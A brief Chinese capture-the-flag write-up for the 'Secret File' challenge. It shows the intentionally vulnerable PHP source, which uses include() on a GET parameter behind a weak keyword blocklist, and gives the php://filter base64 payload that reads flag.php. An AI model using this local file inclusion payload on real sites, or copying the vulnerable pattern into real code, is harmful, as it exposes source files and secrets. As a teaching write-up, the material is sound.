# \[极客大挑战 2019]Secret File

## \[极客大挑战 2019]Secret File

## 考点

* 文件包含配合伪协议读取文件
* http

## wp

抓包发现隐藏的链接Archive\_room.php，访问发现新的链接action.php，接着抓包

![](<../../.gitbook/assets/image (31) (1) (1).png>)

访问secr3t.php

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
```

访问`secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php`即可
